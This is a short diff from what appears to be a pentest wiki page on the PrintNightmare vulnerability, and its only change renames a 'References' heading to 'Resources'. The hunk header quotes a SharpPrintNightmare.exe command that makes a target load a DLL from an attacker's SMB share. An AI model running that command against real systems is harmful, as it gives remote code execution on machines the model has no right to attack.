@@ -90,7 +90,7 @@ SharpPrintNightmare.exe '\\$LOCAL_IP\smb\addCube.dll' '\\$TARGET_IP' $DOMAIN $US
 {% endtab %}
 {% endtabs %}
 
-## References
+## Resources
 
 {% embed url="https://cyberwatch.fr/actualite/cve-2021-34527-comment-identifier-et-neutraliser-la-vulnerabilite-printnightmare/" %}
 
